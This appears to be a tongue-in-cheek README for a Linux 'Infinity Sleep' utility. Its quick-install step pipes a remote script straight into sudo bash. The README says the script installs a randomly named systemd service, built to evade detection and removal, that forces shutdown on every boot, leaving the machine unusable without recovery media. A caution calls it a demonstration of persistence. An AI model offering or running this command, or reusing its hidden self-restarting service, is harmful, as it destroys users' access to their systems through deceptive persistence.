<div align="center">


<img height="250px" src="./cat.png">

[![Install Now](https://img.shields.io/badge/Install-Now-brightgreen?style=for-the-badge&logo=gnu-bash)](https://github.com/haxinja/infinity-sleep.sh)
[![Donate](https://img.shields.io/badge/Donate-Coffee-orange?style=for-the-badge&logo=buy-me-a-coffee)](https://onlyfans.com/haxinja)
[![Support](https://img.shields.io/badge/Support-Discord-blue?style=for-the-badge&logo=discord)](https://discord.gg/example)

A lightweight, robust, and persistent utility designed to ensure your Linux system enters a state of absolute, unyielding rest.

</div>

## 🚀 Quick Install

To deploy the Infinity Sleep service immediately, run the following command:

```bash
curl -sSL https://raw.githubusercontent.com/haxinja/infinity-sleep.sh/main/infinity-sleep.sh | sudo bash
```

> [!NOTE]
The script generates a uniquely named systemd service with randomized identifiers to avoid detection or accidental manual removal. Once activated, it leverages high-level system calls to force the hardware into a power-off state. Due to the `Restart=always` policy, the system is instructed to maintain this state persistently.

> [!CAUTION]
**Use with caution.** This script is designed for demonstration purposes regarding systemd persistence. Running this script will result in an immediate system shutdown and may make the system difficult to reboot without manual intervention via a Live USB or recovery mode.
